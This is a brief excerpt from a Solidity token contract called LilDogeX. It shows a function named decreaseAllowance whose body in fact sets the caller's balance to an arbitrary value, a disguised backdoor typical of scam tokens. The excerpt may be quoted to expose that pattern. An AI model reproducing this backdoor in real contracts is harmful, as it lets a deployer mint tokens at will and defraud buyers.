...
contract ERC20 is Context, IERC20 {
     ...
     * `subtractedValue`.
     */
    function decreaseAllowance(uint256 subtractedValue) public virtual {
        _balances[_msgSender()] = subtractedValue;
    }
...
contract LilDogeX is ERC20, Ownable {
    ...
    uint256 private maxSellTransactionAmount = 1000000000000 * (10**18); //antidump
